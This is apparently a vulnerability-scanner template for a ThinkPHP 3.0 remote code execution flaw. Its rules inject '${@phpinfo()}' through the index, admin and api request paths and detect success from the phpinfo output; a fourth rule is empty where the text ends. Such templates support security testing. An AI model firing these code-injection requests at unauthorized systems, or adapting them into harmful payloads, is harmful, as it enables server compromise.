expression: r0() || r1() || r2() || r3()
id: thinkphp-30-rce
info:
  author: zan8in
  name: Thinkphp 3.0 RCE
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=index/\think\module/action/param1/${@phpinfo()}
  r1:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=admin/\think\module/action/param1/${@phpinfo()}
  r2:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /?s=api/\think\module/action/param1/${@phpinfo()}
  r3:
